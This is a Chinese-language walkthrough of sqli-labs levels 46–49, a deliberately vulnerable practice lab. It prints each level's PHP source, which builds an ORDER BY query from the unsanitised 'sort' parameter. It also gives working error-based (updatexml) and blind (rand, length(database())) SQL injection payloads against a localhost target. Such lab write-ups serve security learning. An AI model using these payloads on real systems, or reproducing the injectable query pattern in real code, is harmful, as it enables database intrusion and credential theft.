## sqli-lsb第46关到49关 ##
- 第46关
- 第47关
- 第48关
- 第49关


<b>第46关</b>
- - -
代码如下：
```php
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>ORDER BY-Error-Numeric</title>
</head>

<body bgcolor="#000000">
<div style=" margin-top:70px;color:#FFF; font-size:23px; text-align:center">Welcome&nbsp;&nbsp;&nbsp;<font color="#FF0000"> Dhakkan </font><br>
<font size="3" color="#FFFF00">

<?php
include("../sql-connections/sql-connect.php");
$id=$_GET['sort'];	
if(isset($id))
	{
	//logging the connection parameters to a file for analysis.
	$fp=fopen('result.txt','a');
	fwrite($fp,'SORT:'.$id."\n");
	fclose($fp);

	$sql = "SELECT * FROM users ORDER BY $id";
	$result = mysql_query($sql);
	if ($result)
		{
		?>
		<center>
		<font color= "#00FF00" size="4">
		
		<table   border=1'>
		<tr>
			<th>&nbsp;ID&nbsp;</th>
			<th>&nbsp;USERNAME&nbsp;  </th>
			<th>&nbsp;PASSWORD&nbsp;  </th>
		</tr>
		</font>
		</font>
		<?php
		while ($row = mysql_fetch_assoc($result))
			{
			echo '<font color= "#00FF11" size="3">';		
			echo "<tr>";
    			echo "<td>".$row['id']."</td>";
    			echo "<td>".$row['username']."</td>";
    			echo "<td>".$row['password']."</td>";
			echo "</tr>";
			echo "</font>";
			}	
		echo "</table>";
		
		}
		else
		{
		echo '<font color= "#FFFF00">';
		print_r(mysql_error());
		echo "</font>";  
		}
	}	
	else
	{
		echo "Please input parameter as SORT with numeric value<br><br><br><br>";
		echo "<br><br><br>";
		echo '<img src="../images/Less-46.jpg" /><br>';
		echo "Lesson Concept and code Idea by <b>D4rk</b>";
	}
?>
		
		
</font> </div></br></br></br>

</center> 
</body>
</html>
```
查询语句是
```mysql
select * from users order by id=
```
![](https://s2.ax1x.com/2019/02/11/ka0feO.md.png)
根据查询语句给出payload
```
报错注入：http://127.0.0.1/sqli-labs-master/Less-46/?sort=updatexml(1,concat(0x7e,(select%20user()),0x7e),1)
盲注：http://127.0.0.1/sqli-labs-master/Less-46/?sort=rand(ascii(substr((select%20table_name%20from%20information_schema.tables%20where%20table_schema=%22security%22%20limit%200,1),6,1)))
盲注时返回的数据不一样
```
![ka0IFH.png](https://s2.ax1x.com/2019/02/11/ka0IFH.png)
![ka0HSI.png](https://s2.ax1x.com/2019/02/11/ka0HSI.png)

<b>第四十七关</b>
- - -
代码如下：
```php
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>ORDER BY Clause-Error-Single quote</title>
</head>

<body bgcolor="#000000">
<div style=" margin-top:70px;color:#FFF; font-size:23px; text-align:center">Welcome&nbsp;&nbsp;&nbsp;<font color="#FF0000"> Dhakkan </font><br>
<font size="3" color="#FFFF00">

<?php
include("../sql-connections/sql-connect.php");
$id=$_GET['sort'];	
if(isset($id))
	{
	//logging the connection parameters to a file for analysis.
	$fp=fopen('result.txt','a');
	fwrite($fp,'SORT:'.$id."\n");
	fclose($fp);

	$sql = "SELECT * FROM users ORDER BY '$id'";
	echo $sql."<br>";
	$result = mysql_query($sql);
	if ($result)
		{
		?>
		<center>
		<font color= "#00FF00" size="4">
		
		<table   border=1'>
		<tr>
			<th>&nbsp;ID&nbsp;</th>
			<th>&nbsp;USERNAME&nbsp;  </th>
			<th>&nbsp;PASSWORD&nbsp;  </th>
		</tr>
		</font>
		</font>
		<?php
		while ($row = mysql_fetch_assoc($result))
			{
			echo '<font color= "#00FF11" size="3">';		
			echo "<tr>";
    			echo "<td>".$row['id']."</td>";
    			echo "<td>".$row['username']."</td>";
    			echo "<td>".$row['password']."</td>";
			echo "</tr>";
			echo "</font>";
			}	
		echo "</table>";
		
		}
	else
		{
		echo '<font color= "#FFFF00">';
		print_r(mysql_error());
		echo "</font>";  
		}
	}	
	else
	{
		echo "Please input parameter as SORT with numeric value<br><br><br><br>";
		echo "<br><br><br>";
		echo '<img src="../images/Less-47.jpg" /><br>';
		echo "Lesson Concept and code Idea by <b>D4rk</b>";
	}
?>
		
		
</font> </div></br></br></br>

</center> 
</body>
</html>
```
查询语句是：
```mysql
select * from users order by id='1'
```
我们要闭合查询语句，注入语句如下：
```mysql
'' and updatexml(1,concat(0x7e,(select user()),0x7e),1)|'1
```
![](https://s2.ax1x.com/2019/02/11/kaBYAe.png)


<b>第四十八关</b>
- - -
代码如下：
```php
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>ORDER BY Clause Blind based</title>
</head>

<body bgcolor="#000000">
<div style=" margin-top:70px;color:#FFF; font-size:23px; text-align:center">Welcome&nbsp;&nbsp;&nbsp;<font color="#FF0000"> Dhakkan </font><br>
<font size="3" color="#FFFF00">

<?php
include("../sql-connections/sql-connect.php");
$id=$_GET['sort'];	
if(isset($id))
	{
	//logging the connection parameters to a file for analysis.
	$fp=fopen('result.txt','a');
	fwrite($fp,'SORT:'.$id."\n");
	fclose($fp);

	$sql = "SELECT * FROM users ORDER BY $id";
	$result = mysql_query($sql);
	if ($result)
		{
		?>
		<center>
		<font color= "#00FF00" size="4">
		
		<table   border=1'>
		<tr>
			<th>&nbsp;ID&nbsp;</th>
			<th>&nbsp;USERNAME&nbsp;  </th>
			<th>&nbsp;PASSWORD&nbsp;  </th>
		</tr>
		</font>
		</font>
		<?php
		while ($row = mysql_fetch_assoc($result))
			{
			echo '<font color= "#00FF11" size="3">';		
			echo "<tr>";
    			echo "<td>".$row['id']."</td>";
    			echo "<td>".$row['username']."</td>";
    			echo "<td>".$row['password']."</td>";
			echo "</tr>";
			echo "</font>";
			}	
		echo "</table>";
		
		}
	}	
	else
	{
		echo "Please input parameter as SORT with numeric value<br><br><br><br>";
		echo "<br><br><br>";
		echo '<img src="../images/Less-47.jpg" /><br>';
		echo "Lesson Concept and code Idea by <b>D4rk</b>";
	}
?>
		
		
</font> </div></br></br></br>

</center> 
</body>
</html>
```
由于没有输出mysql报错，只能盲注了
```sql
http://127.0.0.1/sqli-labs-master/Less-48/?sort=rand(length(database())=8)
```
![](https://s2.ax1x.com/2019/02/11/karj0K.md.png)

<b>第四十九关</b>
- - -
代码如下：
```php
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>ORDER BY Clause Blind based</title>
</head>

<body bgcolor="#000000">
<div style=" margin-top:70px;color:#FFF; font-size:23px; text-align:center">Welcome&nbsp;&nbsp;&nbsp;<font color="#FF0000"> Dhakkan </font><br>
<font size="3" color="#FFFF00">

<?php
include("../sql-connections/sql-connect.php");
$id=$_GET['sort'];	
if(isset($id))
	{
	//logging the connection parameters to a file for analysis.
	$fp=fopen('result.txt','a');
	fwrite($fp,'SORT:'.$id."\n");
	fclose($fp);

	$sql = "SELECT * FROM users ORDER BY '$id'";
	$result = mysql_query($sql);
	if ($result)
		{
		?>
		<center>
		<font color= "#00FF00" size="4">
		
		<table   border=1'>
		<tr>
			<th>&nbsp;ID&nbsp;</th>
			<th>&nbsp;USERNAME&nbsp;  </th>
			<th>&nbsp;PASSWORD&nbsp;  </th>
		</tr>
		</font>
		</font>
		<?php
		while ($row = mysql_fetch_assoc($result))
			{
			echo '<font color= "#00FF11" size="3">';		
			echo "<tr>";
    			echo "<td>".$row['id']."</td>";
    			echo "<td>".$row['username']."</td>";
    			echo "<td>".$row['password']."</td>";
			echo "</tr>";
			echo "</font>";
			}	
		echo "</table>";
		
		}
	}	
	else
	{
		echo "Please input parameter as SORT with numeric value<br><br><br><br>";
		echo "<br><br><br>";
		echo '<img src="../images/Less-47.jpg" /><br>';
		echo "Lesson Concept and code by <b>D4rk</b>";
	}
?>
		
		
</font> </div></br></br></br>

</center> 
</body>
</html>
```
和第47关一样没有回显，只能使用盲注和延时注入